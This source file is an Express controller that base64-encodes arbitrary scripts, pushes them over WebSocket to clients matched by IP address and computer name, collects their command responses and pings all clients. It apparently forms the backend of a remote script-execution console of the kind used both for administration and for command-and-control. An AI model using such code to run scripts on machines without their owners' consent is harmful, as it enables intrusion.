const webSocket = require('../configs/ws.handler');
const commandConsole = require('../services/commandConsole');

exports.sendScriptToClientAction = async (req, res) => {
    try {
        const { user, type, script } = req.body;
        const SEP = 'sep-x8jmjgfmr9';
        const encoded = Buffer.from(script, 'utf8').toString('base64');

        let found = false;

        for (let i = 0; i < webSocket.socketList.length; i++) {
            const socket = webSocket.socketList[i];
            if (socket.ipAddress === user.ipAddress && socket.computerName === user.computerName) {
                const message = `FROM_SERVER${SEP}${type}${SEP}${encoded}`;
                socket.send(message);
                found = true;
            }
        }

        if (!found) {
            return res.status(404).json({ status: 'error', message: 'Client not found' });
        }

        res.status(200).json({ status: 'success' });
    } catch (error) {
        res.status(500).json({
            status: 'server_error',
            message: error.message
        });
    }
};

exports.getCommandResponses = (req, res) => {
    try {
        const { ipAddress, computerName } = req.query;
        const data = commandConsole.getResponses(ipAddress, computerName);
        res.json({ status: 'success', data });
    } catch (error) {
        res.status(500).json({ status: 'server_error', message: error.message });
    }
};

exports.pingAll = (req, res) => {
    try {
        webSocket.socketList.forEach(s => {
            try {
                s.send('ping');
            } catch (e) {
                console.error('Ping failed:', e);
            }
        });
        res.json({ status: 'success' });
    } catch (err) {
        res.status(500).json({ status: 'error', message: err.message });
    }
};
